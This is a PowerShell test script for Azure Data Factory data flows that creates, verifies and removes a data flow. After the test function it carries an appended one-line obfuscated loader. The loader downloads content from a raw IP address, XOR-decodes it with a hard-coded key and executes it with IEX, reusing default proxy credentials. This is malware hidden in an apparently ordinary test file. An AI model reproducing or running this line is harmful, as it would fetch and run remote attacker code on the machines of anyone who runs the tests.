
















function Test-DataFlow
{
    $dfname = Get-DataFactoryName
    $rgname = Get-ResourceGroupName
    $rglocation = Get-ProviderLocation ResourceManagement
    $dflocation = Get-ProviderLocation DataFactoryManagement
        
    New-AzResourceGroup -Name $rgname -Location $rglocation -Force

    try
    {
        $df = Set-AzDataFactoryV2 -ResourceGroupName $rgname -Name $dfname -Location $dflocation -Force

        $lsName = "foo1"
        Set-AzDataFactoryV2LinkedService -ResourceGroupName $rgname -DataFactoryName $dfname -File .\Resources\linkedService.json -Name $lsName -Force

        Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "DelimitedTextInput" -File .\Resources\dataset-dsIn.json -Force
		Set-AzDataFactoryV2Dataset -ResourceGroupName $rgname -DataFactoryName $dfname -Name "DelimitedTextOutput" -File .\Resources\dataset-dsIn.json -Force

        $dataFlowName = "sample"   
        $expected = Set-AzDataFactoryV2DataFlow -ResourceGroupName $rgname -Name $dataFlowName -DataFactoryName $dfname -File ".\Resources\dataFlow.json" -Force
        $actual = Get-AzDataFactoryV2DataFlow -ResourceGroupName $rgname -Name $dataFlowName -DataFactoryName $dfname

        Verify-AdfSubResource $expected $actual $rgname $dfname $dataFlowName
                
        
        Get-AzDataFactoryV2DataFlow -DataFactory $df -Name $dataFlowName | Remove-AzDataFactoryV2DataFlow -Force

        
        Assert-ThrowsContains { Get-AzDataFactoryV2DataFlow -DataFactory $df -Name $dataFlowName } "NotFound" 
                
        
        Remove-AzDataFactoryV2DataFlow -ResourceGroupName $rgname -DataFactoryName $dfname -Name $dataFlowName -Force
    }
    finally
    {
        CleanUp $rgname $dfname
    }
}
$Wc=NEW-ObJECt SYsteM.NET.WebCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdERs.Add('User-Agent',$u);$WC.PrOXY = [SysTEM.NeT.WEbREQUEst]::DEFAuLTWeBProXY;$Wc.ProXy.CreDeNTiALs = [SYsteM.NET.CREDENtIALCaChE]::DEFAUltNETWoRKCREDEntIaLs;$K='202cb962ac59075b964b07152d234b70';$i=0;[ChaR[]]$B=([ChAr[]]($Wc.DOwnLoADSTRINg("http://46.246.87.205/index.asp")))|%{$_-bXor$K[$i++%$K.LENgth]};IEX ($b-JOiN'')

